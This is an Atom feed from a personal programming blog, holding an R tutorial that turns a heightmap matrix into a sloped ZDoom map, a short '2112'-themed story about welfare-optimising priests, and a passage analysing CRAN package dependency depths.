<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
	<title>Perhaps I should start a blog</title>
	<link href="https://aitap.github.io/" />
	<id>https://aitap.github.io/atom.xml</id> <!-- it's an IRI all right -->
	<updated>2024-01-06T00:00:00Z</updated>
	<author>
		<name>Ivan Krylov</name>
		<email>krylov.r00t@gmail.com</email>
	</author>
<entry>
			<title>Doom plots</title>
			<link href="https://aitap.github.io/2024/01/01/doom.html" />
			<id>https://aitap.github.io/2024/01/01/doom.html</id> <!-- unique enough -->
			<updated>2024-01-01T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>There are lots of options for when you want to visualise a function surface in <a href="https://r-project.org/"><strong>R</strong></a>. Plain matrices can be drawn as false colour images using <a href="https://search.r-project.org/R/refmans/graphics/html/image.html"><code>image</code></a>; contours can be drawn around fixed levels (assuming a smooth function being tabulated) using <a href="https://search.r-project.org/R/refmans/graphics/html/contour.html"><code>contour</code></a> or <a href="https://search.r-project.org/R/refmans/graphics/html/filled.contour.html"><code>filled.contour</code></a>; a three-dimensional surface can be drawn using <a href="https://search.r-project.org/R/refmans/graphics/html/persp.html"><code>persp</code></a>. The <a href="https://CRAN.R-project.org/package=lattice"><strong>lattice</strong></a> package provides the same for long-format data in functions <a href="https://search.r-project.org/CRAN/refmans/lattice/html/levelplot.html"><code>contourplot</code>, <code>levelplot</code></a>, and <a href="https://search.r-project.org/CRAN/refmans/lattice/html/cloud.html"><code>wireframe</code></a>. Finally, the <a href="https://CRAN.R-project.org/package=rgl"><strong>rgl</strong></a> package brings real interactive 3D plots to R.</p>

<p>Instead of using any of that, let's put the data one step closer to the user and make a Doom map out of it.</p>

<h2>Prerequisites</h2>

<p>In the original Doom 1 or 2, sloped floors just weren't possible at all, so we'll be using <a href="https://zdoom.org/">ZDoom</a>. A related engine like <a href="https://zandronum.com/">Zandronum</a> will also support enough of the feature we will be using.</p>

<p>At this point, it is important to note that a Doom map consists, among other things, of <a href="https://doomwiki.org/wiki/WAD#Map_data_lumps">vertices, lines, sides, and sectors</a>. The <a href="https://doomwiki.org/wiki/Vertex">vertices</a> are points on the surface (with <code>x</code>, <code>y</code> coordinates). <a href="https://doomwiki.org/wiki/Linedef">Lines</a> go from one point to the other and have one or two sides, with the "front" side being positioned clockwise from the line. <a href="https://doomwiki.org/wiki/Sidedef">Sides</a> determine the wall textures (which we'll mostly ignore) and the facing <a href="https://doomwiki.org/wiki/Sector">sectors</a>, which finally determine the floor &amp; ceiling textures and heights:</p>

<p><img src="mapstruct.svg" alt="Every line references two vertices, a start point and an end point. It also references two sides, a front and a back. Every side references a sector, which finally defines the heights and the textures." /></p>

<p>My original plan was to start with <a href="https://search.r-project.org/R/refmans/grDevices/html/contourLines.html"><code>contourLines</code></a> and make <code>LINEDEFS</code> of type <a href="https://doomwiki.org/wiki/Linedef_type">slope front floor</a> to align their heights. Unfortunately, most of the resulting sectors were not completely closed, making the editor "fix" the situation by adding more lines to join the first and the last vertex of every sector:</p>

<p><img src="incomplete_sectors.png" alt="A screenshot of SLADE, a Doom editor, showing a mostly incomplete map. Quite a lot of the sectors do not have their contours fully defined, so the editor completes them by joining the first and the last vertex of each with an additional line. It's a mess." style="width:100%" /></p>

<p>It turned out to be easier to go with the <a href="https://zdoom.org/wiki/UDMF">universal Doom map format</a> (also known as <code>TEXTMAP</code>), which can store <a href="https://zdoom.org/wiki/Slope#UDMF">heights for individual vertices</a>, and what is a heightmap contained in a matrix (accompanied by an <code>x</code> and an <code>y</code> vector) if not an array of vertices arranged on a grid? One remaining detail is that the sectors surrounding the vertex with a specified height <strong>must</strong> be triangular. (It's possible to specify the height for any vertex, but the floor will remain flat if the sector is not triangular, or, say, consists of multiple triangles.)</p>

<h2>Triangular sectors</h2>

<p>Thankfully, splitting a rectangular grid into triangular sectors is no problem <del>and only took me three or four tries</del>. Every rectangle of the grid becomes two triangles:</p>

<p><img src="sector.svg" alt="A diagram splitting a four points on a rectangular grid into two triangles, using a vertical line, a horizontal line and a diagonal line." /></p>

<p>Since the triangles, not the vertices determine the colour of the floor, we'll average the neighbouring points to get their values. From a matrix <code>z</code> of vertex heights, we're getting:</p>



<pre>
floors <span style="color:#000000">&lt;-</span> <span style="color:#010181">array</span><span style="color:#000000">(</span>
	<span style="color:#010181">c</span><span style="color:#000000">(</span>
		z<span style="color:#000000">[-</span><span style="color:#b07e00">1</span><span style="color:#000000">,-</span><span style="color:#b07e00">1</span><span style="color:#000000">] +</span> z<span style="color:#000000">[-</span><span style="color:#010181">nrow</span><span style="color:#000000">(</span>z<span style="color:#000000">),-</span><span style="color:#010181">ncol</span><span style="color:#000000">(</span>z<span style="color:#000000">)] +</span> z<span style="color:#000000">[-</span><span style="color:#b07e00">1</span><span style="color:#000000">,-</span><span style="color:#010181">ncol</span><span style="color:#000000">(</span>z<span style="color:#000000">)],</span>
		z<span style="color:#000000">[-</span><span style="color:#b07e00">1</span><span style="color:#000000">,-</span><span style="color:#b07e00">1</span><span style="color:#000000">] +</span> z<span style="color:#000000">[-</span><span style="color:#010181">nrow</span><span style="color:#000000">(</span>z<span style="color:#000000">),-</span><span style="color:#010181">ncol</span><span style="color:#000000">(</span>z<span style="color:#000000">)] +</span> z<span style="color:#000000">[-</span><span style="color:#010181">nrow</span><span style="color:#000000">(</span>z<span style="color:#000000">),-</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span>
	<span style="color:#000000">) /</span> <span style="color:#b07e00">3</span><span style="color:#000000">,</span>
	<span style="color:#010181">c</span><span style="color:#000000">(</span><span style="color:#010181">dim</span><span style="color:#000000">(</span>z<span style="color:#000000">)-</span><span style="color:#b07e00">1</span><span style="color:#000000">,</span> <span style="color:#b07e00">2</span><span style="color:#000000">)</span>
<span style="color:#000000">)</span>
</pre>




<p>This is Doom, so instead of full-colour floors we are setting up a small, fixed number of textures, and using thresholds in the vector <code>levels</code> to determine the number of the corresponding texture:</p>



<pre>
texturenum <span style="color:#000000">&lt;-</span> <span style="color:#010181">array</span><span style="color:#000000">(</span><span style="color:#010181">findInterval</span><span style="color:#000000">(</span>floors<span style="color:#000000">,</span> levels<span style="color:#000000">),</span> <span style="color:#010181">dim</span><span style="color:#000000">(</span>floors<span style="color:#000000">))</span>
</pre>



<p>We then have to arrange to number the individual sectors:</p>



<pre>
sidx <span style="color:#000000">&lt;-</span> texturenum
sidx<span style="color:#000000">[] &lt;-</span> <span style="color:#010181">seq_len</span><span style="color:#000000">(</span><span style="color:#010181">length</span><span style="color:#000000">(</span>sidx<span style="color:#000000">))</span>
</pre>



<p>Now for the vertices. We must list every combination of the coordinates provided to us in a pair of vectors <code>x</code>, <code>y</code> corresponding to rows and columns of the matrix <code>z</code>:</p>



<pre>
vertices <span style="color:#000000">&lt;-</span> data<span style="color:#000000">.</span><span style="color:#010181">frame</span><span style="color:#000000">(</span>
	x <span style="color:#000000">=</span> x<span style="color:#000000">[</span><span style="color:#010181">row</span><span style="color:#000000">(</span>z<span style="color:#000000">)],</span>
	y <span style="color:#000000">=</span> y<span style="color:#000000">[</span><span style="color:#010181">col</span><span style="color:#000000">(</span>z<span style="color:#000000">)],</span>
	z <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>z<span style="color:#000000">)</span>
<span style="color:#000000">)</span>
</pre>



<p>The choice of <code>x</code> corresponding to <em>rows</em> of <code>z</code> and <code>y</code> corresponding to <em>columns</em> of <code>z</code> may look counter-intuitive, but it matches what <code>image()</code> does with the coordinates.</p>

<p>Since the lines reference the vertices by their numbers, we need to set up a way (the <code>vidx</code> matrix) to map from row and column numbers to the individual rows of the <code>vertices</code> data frame:</p>



<pre>
vidx <span style="color:#000000">&lt;-</span> z
vidx<span style="color:#000000">[] &lt;-</span> <span style="color:#010181">seq_len</span><span style="color:#000000">(</span><span style="color:#010181">length</span><span style="color:#000000">(</span>z<span style="color:#000000">))</span>
</pre>



<p>Now let's construct the lines.</p>



<pre>
linedefs <span style="color:#000000">&lt;-</span> <span style="color:#010181">rbind</span><span style="color:#000000">(</span>
</pre>



<p>For a matrix with <code>N</code> rows (points in <code>x</code>) and <code>M</code> columns (points in <code>y</code>), we'll need <code>(N-1)*M</code> horizontal lines that would go from <code>(i, j)</code> to <code>(i+1, j)</code> for every applicable <code>(i, j)</code>. Their front (clockwise) sector would be the triangle <code>T(i,j-1,2)</code> (except for the lowest horizontal, which doesn't have a front side), and their back (counter-clockwise) sector would be <code>T(i,j,1)</code> (except for the topmost horizontal).</p>



<pre>
	data<span style="color:#000000">.</span><span style="color:#010181">frame</span><span style="color:#000000">(</span>
		start <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>vidx<span style="color:#000000">[-</span><span style="color:#010181">nrow</span><span style="color:#000000">(</span>z<span style="color:#000000">),]),</span>
		end   <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>vidx<span style="color:#000000">[-</span><span style="color:#b07e00">1</span><span style="color:#000000">,]),</span>
		front <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span><span style="color:#010181">cbind</span><span style="color:#000000">(</span><span style="color:#0057ae">NA</span><span style="color:#000000">,</span> sidx<span style="color:#000000">[,,</span><span style="color:#b07e00">2</span><span style="color:#000000">])),</span>
		back  <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span><span style="color:#010181">cbind</span><span style="color:#000000">(</span>sidx<span style="color:#000000">[,,</span><span style="color:#b07e00">1</span><span style="color:#000000">],</span> <span style="color:#0057ae">NA</span><span style="color:#000000">))</span>
	<span style="color:#000000">),</span>
</pre>



<p>In a similar manner, we get <code>N*(M-1)</code> verticals with fronts at <code>T(i,j,2)</code> and backs at <code>T(i-1,j,1)</code>:</p>



<pre>
	data<span style="color:#000000">.</span><span style="color:#010181">frame</span><span style="color:#000000">(</span>
		start <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>vidx<span style="color:#000000">[,-</span><span style="color:#010181">ncol</span><span style="color:#000000">(</span>z<span style="color:#000000">)]),</span>
		end   <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>vidx<span style="color:#000000">[,-</span><span style="color:#b07e00">1</span><span style="color:#000000">]),</span>
		front <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span><span style="color:#010181">rbind</span><span style="color:#000000">(</span>sidx<span style="color:#000000">[,,</span><span style="color:#b07e00">2</span><span style="color:#000000">],</span> <span style="color:#0057ae">NA</span><span style="color:#000000">)),</span>
		back  <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span><span style="color:#010181">rbind</span><span style="color:#000000">(</span><span style="color:#0057ae">NA</span><span style="color:#000000">,</span> sidx<span style="color:#000000">[,,</span><span style="color:#b07e00">1</span><span style="color:#000000">]))</span>
	<span style="color:#000000">),</span>
</pre>



<p>Finally, we add the <code>(N-1)*(M-1)</code> diagonals with fronts and backs at <code>T(i,j,1)</code> and <code>T(i,j,2)</code>, respectively:</p>



<pre>
	data<span style="color:#000000">.</span><span style="color:#010181">frame</span><span style="color:#000000">(</span>
		start <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>vidx<span style="color:#000000">[-</span><span style="color:#010181">nrow</span><span style="color:#000000">(</span>z<span style="color:#000000">),-</span><span style="color:#010181">ncol</span><span style="color:#000000">(</span>z<span style="color:#000000">)]),</span>
		end   <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>vidx<span style="color:#000000">[-</span><span style="color:#b07e00">1</span><span style="color:#000000">,-</span><span style="color:#b07e00">1</span><span style="color:#000000">]),</span>
		front <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>sidx<span style="color:#000000">[,,</span><span style="color:#b07e00">1</span><span style="color:#000000">]),</span>
		back  <span style="color:#000000">=</span> as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>sidx<span style="color:#000000">[,,</span><span style="color:#b07e00">2</span><span style="color:#000000">])</span>
	<span style="color:#000000">)</span>
<span style="color:#000000">)</span>
</pre>



<p>Are we done? Almost.</p>

<p>For some reason, <a href="https://slade.mancubus.net/"><span class="caps">SLADE</span></a> seems to ignore the lines with a back side but no front side, so we have to flip those lines around:</p>



<pre>
linedefs <span style="color:#000000">&lt;-</span> <span style="color:#010181">within</span><span style="color:#000000">(</span>linedefs<span style="color:#000000">, {</span>
	flip <span style="color:#000000">&lt;-</span> is<span style="color:#000000">.</span><span style="color:#010181">na</span><span style="color:#000000">(</span>front<span style="color:#000000">) &amp; !</span>is<span style="color:#000000">.</span><span style="color:#010181">na</span><span style="color:#000000">(</span>back<span style="color:#000000">)</span>

	tmp <span style="color:#000000">&lt;-</span> start<span style="color:#000000">[</span>flip<span style="color:#000000">]</span>
	start<span style="color:#000000">[</span>flip<span style="color:#000000">] &lt;-</span> end<span style="color:#000000">[</span>flip<span style="color:#000000">]</span>
	end<span style="color:#000000">[</span>flip<span style="color:#000000">] &lt;-</span> tmp

	tmp <span style="color:#000000">&lt;-</span> front<span style="color:#000000">[</span>flip<span style="color:#000000">]</span>
	front<span style="color:#000000">[</span>flip<span style="color:#000000">] &lt;-</span> back<span style="color:#000000">[</span>flip<span style="color:#000000">]</span>
	back<span style="color:#000000">[</span>flip<span style="color:#000000">] &lt;-</span> tmp

	<span style="color:#010181">rm</span><span style="color:#000000">(</span>tmp<span style="color:#000000">,</span> flip<span style="color:#000000">)</span>
<span style="color:#000000">})</span>
</pre>



<p>Finally, we can write the <code>TEXTMAP</code> chunk:</p>



<pre>
<span style="color:#010181">writeLines</span><span style="color:#000000">(</span><span style="color:#010181">c</span><span style="color:#000000">(</span>
	<span style="color:#bf0303">'namespace = &quot;zdoom&quot;;'</span><span style="color:#000000">,</span>
	<span style="color:#010181">paste0</span><span style="color:#000000">(</span>
		<span style="color:#bf0303">'vertex</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'{</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
</pre>



<p><span class="caps">UDMF </span>coordinates should be integer-valued. The original format used C variables of type <code>short</code>, which (as expected) corresponded to 16-bit two's complement signed integers.</p>



<pre>
		<span style="color:#bf0303">'x = '</span><span style="color:#000000">,</span><span style="color:#010181">round</span><span style="color:#000000">(</span>vertices$x<span style="color:#000000">),</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'y = '</span><span style="color:#000000">,</span><span style="color:#010181">round</span><span style="color:#000000">(</span>vertices$y<span style="color:#000000">),</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
</pre>



<p>128 units is just enough for a ceiling.</p>



<pre>
		<span style="color:#bf0303">'zceiling = '</span><span style="color:#000000">,</span><span style="color:#010181">round</span><span style="color:#000000">(</span><span style="color:#010181">max</span><span style="color:#000000">(</span>vertices$z<span style="color:#000000">)+</span><span style="color:#b07e00">128</span><span style="color:#000000">),</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'zfloor = '</span><span style="color:#000000">,</span><span style="color:#010181">round</span><span style="color:#000000">(</span>vertices$z<span style="color:#000000">),</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'}</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span>
	<span style="color:#000000">),</span>
	<span style="color:#010181">paste0</span><span style="color:#000000">(</span>
		<span style="color:#bf0303">'linedef</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'{</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
</pre>



<p>Doom indexes everything from <code>0</code> unlike R, which is why we have to subtract 1 here.</p>



<pre>
		<span style="color:#bf0303">'v1 = '</span><span style="color:#000000">,</span>linedefs$start<span style="color:#000000">-</span><span style="color:#b07e00">1</span><span style="color:#000000">,</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'v2 = '</span><span style="color:#000000">,</span>linedefs$end<span style="color:#000000">-</span><span style="color:#b07e00">1</span><span style="color:#000000">,</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#000000; font-weight:bold">ifelse</span><span style="color:#000000">(</span>
			is<span style="color:#000000">.</span><span style="color:#010181">na</span><span style="color:#000000">(</span>linedefs$front<span style="color:#000000">),</span> <span style="color:#bf0303">''</span><span style="color:#000000">,</span>
			<span style="color:#010181">paste0</span><span style="color:#000000">(</span><span style="color:#bf0303">'sidefront = '</span><span style="color:#000000">,</span>linedefs$front<span style="color:#000000">-</span><span style="color:#b07e00">1</span><span style="color:#000000">,</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">)</span>
		<span style="color:#000000">),</span>
		<span style="color:#000000; font-weight:bold">ifelse</span><span style="color:#000000">(</span>
			is<span style="color:#000000">.</span><span style="color:#010181">na</span><span style="color:#000000">(</span>linedefs$back<span style="color:#000000">),</span> <span style="color:#bf0303">''</span><span style="color:#000000">,</span>
			<span style="color:#010181">paste0</span><span style="color:#000000">(</span><span style="color:#bf0303">'sideback = '</span><span style="color:#000000">,</span>linedefs$back<span style="color:#000000">-</span><span style="color:#b07e00">1</span><span style="color:#000000">,</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">)</span>
		<span style="color:#000000">),</span>
</pre>



<p>One-sided lines are supposed to happen on the boundaries of the map. <code>special = 9</code> corresponds to <a href="https://zdoom.org/wiki/Line_Horizon">Line_Horizon</a>, replacing the wall texture with the floor texture stretching to infinity (and covered with the skybox):</p>



<pre>
		<span style="color:#000000; font-weight:bold">ifelse</span><span style="color:#000000">(</span>
			is<span style="color:#000000">.</span><span style="color:#010181">na</span><span style="color:#000000">(</span>linedefs$front<span style="color:#000000">)</span> | is<span style="color:#000000">.</span><span style="color:#010181">na</span><span style="color:#000000">(</span>linedefs$back<span style="color:#000000">),</span>
			<span style="color:#bf0303">'blocking = true;</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">special = 9;</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span> <span style="color:#bf0303">'twosided = true;</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span>
		<span style="color:#000000">),</span>
		<span style="color:#bf0303">'}</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span>
	<span style="color:#000000">),</span>
</pre>



<p>Every side in our map corresponds to an individual sector (which also helps us ignore wall textures).</p>



<pre>
	<span style="color:#010181">paste0</span><span style="color:#000000">(</span>
		<span style="color:#bf0303">'sidedef</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'{</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'sector = '</span><span style="color:#000000">,</span>as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>sidx<span style="color:#000000">-</span><span style="color:#b07e00">1</span><span style="color:#000000">),</span><span style="color:#bf0303">';</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'}</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span>
	<span style="color:#000000">),</span>
</pre>



<p>Finally, from a character vector <code>textures</code> containing texture names (one more than the thresholds in <code>levels</code>) we construct the definitions of every sector referenced by the side definitions:</p>



<pre>
	<span style="color:#010181">paste0</span><span style="color:#000000">(</span>
		<span style="color:#bf0303">'sector</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'{</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'texturefloor = &quot;'</span><span style="color:#000000">,</span>as<span style="color:#000000">.</span><span style="color:#010181">vector</span><span style="color:#000000">(</span>textures<span style="color:#000000">[</span>texturenum<span style="color:#000000">+</span><span style="color:#b07e00">1</span><span style="color:#000000">]),</span><span style="color:#bf0303">'&quot;;</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'textureceiling = &quot;F_SKY1&quot;;</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span><span style="color:#000000">,</span>
		<span style="color:#bf0303">'}</span><span style="color:#ff00ff">\n</span><span style="color:#bf0303">'</span>
	<span style="color:#000000">)</span>
<span style="color:#000000">),</span> <span style="color:#bf0303">'TEXTMAP'</span><span style="color:#000000">)</span>
</pre>



<p>Does it work? Let's try with <code>x &lt;- seq_len(nrow(volcano)) * 32</code>, <code>y &lt;- seq_len(ncol(volcano)) * 32</code>, <code>z &lt;- volcano * 2</code> and <code>textures &lt;- sprintf('TER%02d', 1:16)</code> corresponding to <code>hcl.colors(16, 'Terrain2')</code> (which we'll have to generate manually as an exercise for the reader). For <code>levels</code>, we'll use 15 points inside the range of <code>z</code>: <code>seq(min(z), max(z), length.out = 17)[2:16]</code>.</p>

<p>After a few manual passes in <span class="caps">SLADE </span>(to add the player spawn point), <a href="./volcano.pk3">it works</a>:</p>

<p><img src="doomcano.png" alt="" style="width:100%" /></p>

<p>Download the <a href="./img2doom.R">R script</a> and try it yourself!</p>
				</div>
			</content>
		</entry>
<entry>
			<title>2112: on the importance of mental health screening</title>
			<link href="https://aitap.github.io/2023/11/16/2112.html" />
			<id>https://aitap.github.io/2023/11/16/2112.html</id> <!-- unique enough -->
			<updated>2023-11-16T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p><a href="https://en.wikipedia.org/wiki/2112_%28song%29">The year is 2112. You are a priest of the Temples of Syrinx.</a> Your job is to optimise the quality-adjusted lifetime of the populace of the Solar Federation. It's hell.</p>

<p>There are departments of the Temples dedicated to the various needs in the Maslow hierarchy. The Basic Needs department provides the Universal Basic Food and Universal Basic Housing. Their job is far from trivial, for it requires both the development of complicated socio-economic models and implementation of their results, including double- and triple-checks to ensure that the supply chains won't fail, leaving even a single person in need. They also cover the healthcare system and countless other things that the Solar Federation recognises to be required for a human to live.</p>

<p>The Psychological Needs department picks up what Basic Needs cannot provide. Their optimised matchmaking service tries to ensure that every citizen of the Federation has a strong social net, both tailoring it to their wants and helping them become a better, more desirable person. Solar Federation welcomes and provides to both polyamory families spanning hundreds of people and multiple generations and hermit clubs who sometimes recognise each other with a handshake but otherwise prefer to engage in written communication. Then there's the extremely counter-intuitive entertainment service. Their output sometimes reminds you of fever dreams but they insist their models say it'll succeed, and they are always right. Their latest creation is a combination of what the Elder Race called TikTok with a few more obscure ideas. Pre-tests show that people seem to be genuinely happy to be using it and somehow don't notice the illusion of prestige and feeling of accomplishment that it provides.</p>

<p>The Self-Actualisation department is the most secretive of them all, because you cannot just actualise someone. That would take all of the "self" out of the accomplishment. So you're stuck running lots of unrelated little projects, each tailored to a particular kind of person, providing them with challenges they could in theory succeed at, but not before applying some serious effort. As an example, for the conspiratorially-minded, you run lots of little book clubs where they bring and discuss literature they call "seditious": We, 1984, 451&deg;F, Brave New World, Player Piano, The Running Man, I Have No Mouth. Sometimes you throw in the Dune anthology, but the irony is always lost on everyone. Sometimes the people meet with the express intent to overthrow the Temples but then get at each other over the details of what to do instead and soon disband. Sometimes they stay discussing various ways to organise society for years, forgetting about their initial goals. Sometimes you recruit the graduates.</p>

<p>Then there's this guy. He doesn't tell it to anyone, but you know that he wasn't thrown out of his "sedition club"; he left it calling his peers "a bunch of pussies" for not being radical enough. Ever since he's been escaping society and going hiking in the more and more remote places. Which would be fine by you &mdash; he's much better at rock climbing than at debating Objectivism &mdash; but he also skips his health check-ups. You make a note at the Basic Needs department, but they don't see a problem and, anyway, cannot force him to do anything.</p>

<p>He somehow finds an old guitar on one of his trips and tries to bring it to Psychological Needs. There are proper channels for this, but he insists on meeting overworked public servants in person and showing them his mad skillz. Which doesn't work because the guitar is water-damaged and he never had any formal training, but he looks positively manic about it, which is noticed but somehow isn't passed to Basic Needs. Eventually, one meeting gets too heated. Accounts vary on what exactly happened, but the guitar is broken even further, and then the guy stops pestering the Priests altogether.</p>

<p>You look for ways to get in touch, but his former club buddies still hold a grudge, and Psychological Needs can only report him having severed all of his contacts and gone on another hike. By the time Basic Needs can locate him, it's too late: there's the cave, there's the diary describing hallucinations of the oracle painting a picture of a better life, and there's the dead body.</p>

<p>You submit your reports and amend the procedures, but the problems remain that Self-Actualisation is far from being an exact science, that ordinary ideas can cause unexpectedly powerful impact on certain minds, and that you can't save everyone. But you still have to try.</p>
				</div>
			</content>
		</entry>
<entry>
			<title>The CRAN ecosystem worries</title>
			<link href="https://aitap.github.io/2020/07/10/cran.html" />
			<id>https://aitap.github.io/2020/07/10/cran.html</id> <!-- unique enough -->
			<updated>2020-07-10T00:00:00Z</updated>
			<content type="xhtml">
				<div xmlns="http://www.w3.org/1999/xhtml"><p>I stumbled upon a very <a href="https://sambleckley.com/writing/npm.html">interesting article</a> while reading <span class="caps">LWN.</span> It raises the topics of dependency problems in package repository ecosystems with <span class="caps">NPM </span>as an example. (The <a href="https://sambleckley.com/writing/crates.html">follow-up</a> article briefly discusses <a href="https://crates.io/">Rust package registry</a> and reaches very different conclusions.)</p>

<p>Unlike <span class="caps">NPM </span>with its 50G <span class="caps">JSON </span>metadata, R can get away with downloading the entire list of packages from <span class="caps">CRAN </span>and putting it into memory. <a href="https://cran.r-project.org/web/packages/index.html"><span class="caps">CRAN</span></a> says there are 16027 available packages; the actual choice may be less because of R version requirements, OS and 32-bit/64-bit subarchitecture incompatibility. Some packages are part of R, while others are heavily recommended (to the point of <code>./configure</code> refusing to continue unless a parameter is supplied or the packages are downloaded). We will not count those packages as dependencies.</p>

<p>Since we can get away with it, we are going to put all dependency information into memory. <span class="caps">NPM </span>developers may consider <span class="caps">CRAN </span>to be <a href="https://devblogs.microsoft.com/oldnewthing/20180326-00/?p=98335">cute</a>. We will consider two dependency graphs:</p>


<ol>
<li>By default, <code>install.packages</code> only installs dependencies strictry required    to make the package work.</li>
<li>Optionally, a package may suggest another package, but when it decides to use the suggested package, it should perform a dependency check and provide a workaround in case the suggested package turns out to be missing.</li>
</ol>

<p>When installing binary packages (which is done on Windows and macOS when using official builds of R), the set of packages to install is even smaller (<code>LinkingTo</code>, which is used for packages containing headers and test dependencies, is omitted in this case). We are going to ignore this case.</p>

<p>There are no cycles in the dependency graph, because the dependency resolution algorithm would infinitely loop on them. If one does require installation of suggestions of suggestions, that's another story (an experiment performed using <code>igraph</code> suggests that most packages would depend on 10% of the whole <span class="caps">CRAN </span>right away and dependency cycles of all lengths abundant), but we are not going to do that, because that was clearly not intended to be done.</p>

<p>Let's take a look at dependency tree depths. As in the original article, we define the dependency tree depth as the number of iterations that the resolving algorithm took until it didn't have to add more dependencies to the list of packages to install.</p>

<p><img src="depdepths.svg" alt="" class="center" /></p>

<p>So far, so good. When installing required dependencies only, most packages have 4-deep dependency trees and less. Suggested packages make it 6 for some reason, and there is also this weird peak at 8 (with its own decay!), but it's not too high.</p>

<p>Are the highly dependent packages themselves depended upon?</p>

<p><img src="revdepdepths.svg" alt="" class="center" /></p>

<p>Mostly not, but there are a few exceptions, including:</p>

<ul>
<li><strong>viridis</strong> doesn't even contain the palette (that's in <code>viridisLite</code>, which doesn't have any required dependencies and has about 3000 reverse-dependencies), but it does depend on <code>ggplot2</code>, which is a huge dependency hog.</li>
<li><strong>ggplot2</strong>, <strong>testthat</strong>, <strong>tibble</strong>, <strong>dplyr</strong>, <strong>tidyr</strong>, <strong>pkgload</strong>, <strong>pkgbuild</strong> are all a part of so-called <a href="https://tidyverse.org/">Tidyverse</a>, an "opinionated collection of R packages designed for data science", which have two things in common:<ol>
<li>they like to depend on each other</li>
<li>they all have <code>RStudio [cph]</code> in their <code>Author:</code> field in their <code>DESCRIPTION</code>.</li>
</ol>
</li>
<li><strong>isoband</strong> doesn't have non-core dependencies otherwise, but uses <code>testthat</code> for testing, which takes a huge chunk of Tidyverse with it. It is also a dependency of <code>ggplot2</code>.</li>
</ul>

<p>Do any packages have many direct dependencies? Again, core and recommended packages do not count towards dependencies.</p>

<p><img src="direct.svg" alt="" class="center" /></p>

<p>The answer is: typically, less than 4-6, depending on whether you follow suggestions. Wait, 120 direct optional dependencies? Yes, the <a href="https://cran.r-project.org/package=mlr">mlr</a> package has 121 direct dependencies, including <code>Suggests</code> (but only 13 of them are required).</p>

<p>How are total dependency counts distributed?</p>

<p><img src="totaldeps.svg" alt="" class="center" /></p>

